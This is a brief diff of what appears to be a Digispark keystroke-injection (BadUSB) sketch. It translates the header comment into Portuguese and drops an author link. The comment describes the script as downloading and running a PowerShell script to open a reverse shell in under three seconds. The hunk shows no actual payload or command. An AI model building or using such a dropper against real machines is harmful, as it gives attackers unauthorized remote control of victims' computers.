@@ -1,7 +1,4 @@
-// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
-
-// For more scripts checkout: https://github.com/m6sser
-// m6sser | 01/02/2023 @14:00 UTC
+// Este script baixa e executa um script PowerShell abrindo efetivamente um shell reverso em menos de 3 segundos.
 
 #include "DigiKeyboard.h"
 void setup() {
